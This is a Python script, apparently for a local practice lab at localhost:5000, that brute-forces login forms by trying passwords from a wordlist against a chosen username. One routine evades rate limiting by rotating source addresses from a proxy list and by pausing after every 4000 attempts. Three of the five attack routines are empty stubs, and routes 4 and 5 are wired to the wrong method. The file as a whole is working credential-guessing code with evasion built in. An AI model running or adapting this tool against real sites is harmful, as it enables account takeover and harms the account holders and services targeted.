# imports
import time
import requests
import http.client
from termcolor import colored


'''
	Login form bruteforce class:
		each login form has implements different techniques
		to evade the implemented login form security
'''
class Attack():
	def __init__(self):
		# url of website
		self.url = 'http://localhost:5000'

		# username to bruteforce
		self.username = ''

		# list of proxies
		self.proxies = [line.strip() for line in open('proxies', 'r')]

		# list of commonly used passwords
		self.passwords = [line.strip() for line in open('passwords', 'r')]

		self.select()


	# select login form to try to attack
	def select(self):

		# get login form and username
		route = input('Login form number [1, 5]: ')
		self.username = input('Username to attack: ')
		self.url = f'{self.url}/login_{route}'

		# launch attack
		if route == '1':
			self.form_1()

		if route == '2':
			self.form_2()

		if route == '3':
			self.form_3()

		if route == '4':
			self.form_3()

		if route == '5':
			self.form_3()



	# attack login form #1
	def form_1(self):

		# try each password until success status
		index = 0
		for p in self.passwords:
			# create login data
			data = {
				'username': self.username,
				'password': p,
			}

			# send the request
			response = requests.post(self.url, data=data)

			# verify login status
			if b'incorrect' in response.content:
				c = '[' + colored(f'Failed {index}', 'red', attrs=['bold']) + ']'
				print(f'{c} : {self.username, p}')
			else:
				c = '[' + colored('Success', 'green', attrs=['bold', 'blink']) + ']'
				print(f'\n{c} : {self.username, p}')
				break

			index += 1


	# attack login form #2
	def form_2(self):

		index = 0
		proxy_index = 0
		attempted = 0

		# try each password until success status
		for p in self.passwords:
			# use proxy address to bypass rate limit
			proxy = self.proxies[proxy_index]  

			# create login data
			data = f'username={self.username}&password={p}'

			# Create a custom socket to bind proxy address
			custom_socket = http.client.HTTPConnection('localhost', 5000, source_address=(proxy, 0))

			# send request
			custom_socket.request('POST', '/login_2', body=data, headers={'Content-Type': 'application/x-www-form-urlencoded'})

			# # # verify login status
			response = custom_socket.getresponse()
			attempted += 1

			# Read the response content
			response_content = response.read().decode('utf-8')

			# verify login status
			if 'incorrect' in response_content:
				c = '[' + colored(f'Failed {index}', 'red', attrs=['bold']) + ']'
				print(f'{c} : {self.username, p}')
			else:
				c = '[' + colored('Success', 'green', attrs=['bold', 'blink']) + ']'
				print(f'\n{c} : {self.username, p}')
				break

			# close socket
			custom_socket.close()

			# # sleep for about a minute every 4000 requests
			if attempted % 4000 == 0: 
				c = '[' + colored('Sleeping', 'yellow', attrs=['bold', 'underline']) + ']'
				print(f'\n{c} : Attempted 4000 logins for user: {self.username}')
				attempted = 0
				time.sleep(75)

			# rotate to the next proxy
			proxy_index = (proxy_index + 1) % len(self.proxies)
			index += 1


	# attack login form #3
	def form_3(self):
		pass

	# attack login form #4
	def form_4(self):
		pass

	# attack login form #5
	def form_5(self):
		pass



# start
if __name__ == '__main__':
	attack = Attack()